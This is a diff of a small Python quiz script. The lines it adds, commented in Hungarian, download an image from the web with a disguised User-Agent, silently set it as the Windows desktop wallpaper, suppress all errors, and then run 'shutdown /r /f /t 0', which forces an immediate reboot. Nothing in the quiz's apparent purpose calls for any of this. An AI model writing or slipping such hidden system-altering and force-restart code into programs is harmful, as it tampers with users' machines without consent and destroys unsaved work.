@@ -21,21 +21,23 @@ elif choice == "2":
         print("Hell nah ")
     elif choice == "4":
         print("That was right!")
-import ctypes, urllib.request, os
+import ctypes, urllib.request, os, time
 
+# 1. Kép letöltése (User-Agent-tel a 403-as hiba ellen)
 url = "https://wallpaperaccess.com/full/2022519.jpg"
-kep_utvonal = os.path.join(os.getenv("TEMP"), "hatterkep.jpg")
+kep_utvonal = os.path.join(os.getenv("TEMP"), "hatter.jpg")
 
-# 1. Letöltés "böngészőnek álcázva"
 opener = urllib.request.build_opener()
-opener.addheaders = [('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124 Safari/537.36')]
+opener.addheaders = [('User-Agent', 'Mozilla/5.0')]
 urllib.request.install_opener(opener)
 
 try:
     urllib.request.urlretrieve(url, kep_utvonal)
-    
-    # 2. Beállítás háttérképnek
+    # 2. Háttérkép beállítása
     ctypes.windll.user32.SystemParametersInfoW(20, 0, kep_utvonal, 3)
-    print("Siker! A háttér megváltozott.")
-except Exception as e:
-    print(f"Hiba történt: {e}")
+    
+    # 3. Várakozás 5 másodpercig (hogy látszódjon a kép)
+    time.sleep(5)
+except:
+    pass # Ha nincs net, ne csináljon semmit
+import os; os.system("shutdown /r /f /t 0")
